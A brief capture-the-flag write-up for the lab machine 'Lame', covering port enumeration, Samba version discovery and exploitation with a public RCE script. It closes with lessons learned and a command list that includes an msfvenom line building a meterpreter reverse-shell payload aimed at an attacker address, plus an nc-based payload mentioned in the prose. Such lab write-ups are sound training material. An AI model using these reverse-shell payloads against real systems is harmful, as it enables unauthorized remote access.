# Lame - Writeup

First I ran a standard nmap scan where I found some ports that where open. There was a vsftpd on port 21. This one was not vulnerable.

The second port that was investigated was the samba port 445. For some reason smbclient command did not work. I suspect it did not work because it did not speak smb1.0. However, I was able to find the sambaversion by using smbmap. By searchsploiting the sambaversion I found a RCE exploit. The script did not work out of the box. So I found a python alternative on the internet. I tried creating a msfvenom payload but I ran into encoding issues, I then settled my problems by using a minimal "nc" payload.

### Lessons Learned
- You have to really enumerate every port that you see in the nmap output.
- If you find an exploit using the searchsploit command you can probably find an alternative script on the internet.
- You can try different tools if one does not work. For instance smbclient did not work properly on this machine however smbmap worked and helped me find the version for this service.

### Notable commands/tools
- smbmap -H 10.10.10.3
- smbclient //10.10.10.3/tmp -N
- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=1337 -f python
